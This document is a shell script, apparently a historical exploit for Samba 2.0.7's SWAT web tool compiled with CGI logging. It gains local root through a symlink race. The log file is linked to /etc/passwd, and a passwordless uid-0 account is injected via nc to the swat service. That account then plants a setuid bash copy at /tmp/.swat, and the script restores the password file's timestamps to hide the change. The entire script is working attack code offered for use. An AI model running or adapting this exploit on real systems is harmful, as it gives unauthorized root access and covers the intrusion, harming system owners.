#!/bin/sh
# swat for samba 2.0.7 compiled with cgi logging exploit
# discovered by miah <miah@uberhax0r.net>
# exploit by optyx <optyx@uberhax0r.net>
if [ -f /tmp/cgi.log ]; then
if [ `rm -f /tmp/cgi.log` ]; then
echo "/tmp/cgi.log exists and cannot be deleted"
exit
fi
fi
echo "backing up /etc/passwd"
cp -pd /etc/passwd /tmp/.bak
touch -r /etc/passwd /tmp/.bak
ln -s /etc/passwd /tmp/cgi.log
echo "connecting to swat"
echo -e "uberhaxr::0:0:optyx r0x y3r b0x:/:/bin/bash\n"| nc -w 1 localhost swat
if [ `su -l uberhaxr -c "cp /bin/bash /tmp/.swat"` ]; then
echo "exploit failed"
rm /tmp/.bak
rm /tmp/cgi.log
exit
fi
su -l uberhaxr -c "chmod u+s /tmp/.swat"
echo "restoring /etc/passwd"
su -l uberhaxr -c "cp -pd /tmp/.bak /etc/passwd; \
chown root.root /etc/passwd; \
touch -r /tmp/.bak /etc/passwd"
rm /tmp/.bak
rm /tmp/cgi.log
echo "got root? (might want to rm /tmp/.swat)"
/tmp/.swat
